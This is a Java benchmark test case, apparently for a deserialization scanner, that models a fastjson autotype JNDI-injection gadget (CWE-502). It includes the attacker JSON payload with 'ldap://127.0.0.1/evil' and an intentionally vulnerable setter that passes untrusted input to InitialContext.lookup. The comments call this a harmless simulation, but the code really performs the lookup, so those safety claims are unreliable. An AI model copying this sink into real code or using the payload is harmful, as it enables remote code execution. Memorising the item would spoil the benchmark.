package com.jsef.benchmark.vuln.gadgetmine;

import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * JSEF-Benchmark gadgetmine 族 — JndiRowSetImpl 风格 JNDI 链（vuln）
 * ============================================================
 * 验收维度（依据 new_tool_plan_all.md §一）：
 *   (1) 类型过闸：autoTypeSupport=true，@type 声明类可经 fastjson 类型解析；
 *   (5) 可被加载：类路径存在（JDK 自带 javax.naming.InitialContext）；
 *   (8) 有 setter 驱动入口：setDataSourceName(String) 可被 fastjson 反射调用；
 *   (9) 危险 sink 可达：setDataSourceName 内部触发 InitialContext.lookup；
 *   (10) 数据流可控：用户输入的 dataSourceName 直达 lookup 参数；
 *   (11) 依赖可达：JDK 自带 javax.naming，无额外依赖缺口。
 *
 * 给定配置（验收前提）：
 *   - fastjson 1.2.83，autoTypeSupport=true（类型过闸开启）；
 *   - 类在 classpath：javax.naming.InitialContext（JDK 自带，满足可被加载）；
 *   - 攻击者 JSON：{"@type":"...JndiRowSetStub","dataSourceName":"ldap://127.0.0.1/evil"}。
 *
 * 预期结果：VULN（CWE-502）。
 * 依据：fastjson 在 autotype 开启下按 @type 实例化本占位类，反射调用
 *   setDataSourceName 写入不可信 dataSourceName，随后触发初始上下文 lookup，
 *   回连 127.0.0.1 拉取远端工厂，构成 JNDI 注入 RCE gadget。
 *
 * 安全底线声明：仅 localhost 演示语义。本文件不引用任何真实 com.alibaba.fastjson
 * 依赖，JndiRowSetStub 为教学占位类；lookup 为模拟方法调用，仅表达"回连 127.0.0.1"
 * 的语义，不提供针对真实目标的利用脚本。
 */
public class GmJndiFullChain {

    /**
     * 教学占位类：语义等价 JdbcRowSetImpl 的 JNDI 触发路径。
     * 不实现任何真实网络回连；仅通过方法名/注释声明真实语义。
     */
    public static class JndiRowSetStub {

        /** 不可信数据源名（攻击者控制），来自 fastjson setter 驱动入口。 */
        private String dataSourceName;

        /**
         * setter 驱动入口：fastjson 经反射调用，将不可信 dataSourceName 写入字段。
         * 此行即 (8) setter 驱动入口的触发点。
         */
        public void setDataSourceName(String dataSourceName) {
            this.dataSourceName = dataSourceName;
            // [CHECKPOINT id=JSEF-GM-001 cwe=502 level=L3 source=@type/setDataSourceName sink=InitialContext.lookup (JNDI, autotype on, 1.2.83) expect=VULN trace=benchmark/cases/vuln/gadgetmine/GmJndiFullChain.java:46,benchmark/cases/vuln/gadgetmine/GmJndiFullChain.java:49]
            triggerLookup(this.dataSourceName); // SINK_LINE: 危险 sink 可达 InitialContext.lookup
        }

        /**
         * 模拟 sink：语义等价 javax.naming.InitialContext.lookup(name)，
         * 回连 127.0.0.1 拉取远端工厂（JNDI 注入 RCE gadget 终点）。
         * 本占位实现仅做打印以表达"按不可信 name 发起 lookup"的语义。
         */
        private void triggerLookup(String name) {
            try {
                // 语义等价：new InitialContext().lookup(name) —— 不可信 name 直达 JNDI lookup
                InitialContext ctx = new InitialContext();
                Object ref = ctx.lookup(name); // 模拟 sink：真实语义为 InitialContext.lookup(name)
                System.out.println("[demo-only] JNDI lookup on: " + name + " -> " + ref);
            } catch (NamingException e) {
                System.out.println("[demo-only] lookup failed (demo only): " + name);
            }
        }
    }

    /**
     * 验收入口：模拟 fastjson 在 autotype 开启下按 @type 实例化并反射设值。
     * 仅 localhost 演示，不调用真实 fastjson。
     */
    public static void demo() {
        JndiRowSetStub stub = new JndiRowSetStub();
        stub.setDataSourceName("ldap://127.0.0.1/evil"); // 攻击者控制输入
    }
}
